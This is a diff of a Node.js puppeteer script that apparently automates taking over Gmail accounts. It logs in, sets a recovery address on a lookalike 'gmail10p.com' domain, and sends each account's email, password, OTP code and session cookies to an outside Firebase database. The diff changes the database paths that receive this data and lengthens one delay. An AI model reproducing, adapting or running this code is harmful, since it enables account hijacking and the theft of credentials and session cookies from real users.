@@ -3,7 +3,7 @@ const puppeteer = require('puppeteer-extra')
 const axios = require('axios')
 
 
-const BASE_URL = 'https://job-server-088-default-rtdb.firebaseio.com/raiyan088/codemail_new' 
+const BASE_URL = 'https://job-server-088-default-rtdb.firebaseio.com/raiyan088/codemail_pending' 
 
 
 let mCookie = [
@@ -365,7 +365,7 @@ async function loginWithCompleted(number, password, cookies) {
                     await page.keyboard.type(mUser+'@gmail10p.com')
                     await delay(500)
                     await page.click('button[type="submit"]')
-                    await delay(3000)
+                    await delay(3000000)
 
                     console.log('Set Recovary Gmail: '+mUser+'@gmail.com')
 
@@ -396,7 +396,7 @@ async function loginWithCompleted(number, password, cookies) {
                 if (mRapt == null) {
                     console.log('Chenge Error: '+number)
                 
-                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_new/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
@@ -404,7 +404,7 @@ async function loginWithCompleted(number, password, cookies) {
                 } else {
                     console.log('All Chenge Success: '+number)
                 
-                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_new/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
